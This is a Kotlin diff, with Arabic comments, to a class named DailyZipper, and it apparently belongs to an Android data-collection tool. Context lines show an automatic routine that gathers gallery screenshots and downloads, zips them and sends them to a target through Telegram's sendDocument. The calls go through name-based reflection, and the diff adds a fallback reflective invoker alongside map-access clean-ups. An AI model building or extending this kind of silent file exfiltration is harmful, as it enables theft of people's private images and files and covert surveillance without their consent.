@@ -267,6 +267,7 @@ class DailyZipper(
 
     // ============================================================
     //  إرسال الملفات إلى Telegram - بدون دوال مساعدة خارجية
+    //  استخدام map.get() بدلاً من map[]
     // ============================================================
 
     private suspend fun safeSend(
@@ -301,12 +302,14 @@ class DailyZipper(
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
 
-                // استخراج القيمة مباشرة بدون أي دوال مساعدة
+                // استخراج القيمة باستخدام map.get() بدلاً من map[]
                 val success = when (result) {
                     is Boolean -> result
                     is Map<*, *> -> {
-                        val value = result["ok"]
-                        value is Boolean && value
+                        @Suppress("UNCHECKED_CAST")
+                        val map = result as? Map<String, Any?>
+                        val okValue = map?.get("ok")
+                        okValue is Boolean && okValue
                     }
                     else -> false
                 }
@@ -616,7 +619,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي - بدون دوال مساعدة
+    //  التشغيل التلقائي - بدون دوال مساعدة، باستخدام map.get()
     // ============================================================
 
     fun run(): Boolean {
@@ -637,9 +640,11 @@ class DailyZipper(
                     listOf("screenshot", "download").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // استخراج المسار مباشرة
+                            // استخراج المسار باستخدام map.get()
                             val path = if (item is Map<*, *>) {
-                                val value = item["path"]
+                                @Suppress("UNCHECKED_CAST")
+                                val map = item as? Map<String, Any?>
+                                val value = map?.get("path")
                                 value?.toString() ?: ""
                             } else {
                                 ""
@@ -733,6 +738,24 @@ class DailyZipper(
         return try {
             val method = target.javaClass.methods.firstOrNull { it.name == methodName }
                 ?: return null
+            method.isAccessible = true
+            method.invoke(target, *args)
+        } catch (e: Exception) {
+            // محاولة بديلة باستخدام الأنواع
+            invokeMethodFallback(target, methodName, *args)
+        }
+    }
+
+    private fun invokeMethodFallback(target: Any?, methodName: String, vararg args: Any?): Any? {
+        if (target == null) return null
+        return try {
+            val argClasses = args.map { it?.javaClass ?: Any::class.java }.toTypedArray()
+            val method = target.javaClass.methods.firstOrNull { m ->
+                if (m.name != methodName) return@firstOrNull false
+                val params = m.parameterTypes
+                if (params.size != args.size) return@firstOrNull false
+                true
+            } ?: return null
             method.isAccessible = true
             method.invoke(target, *args)
         } catch (e: Exception) {
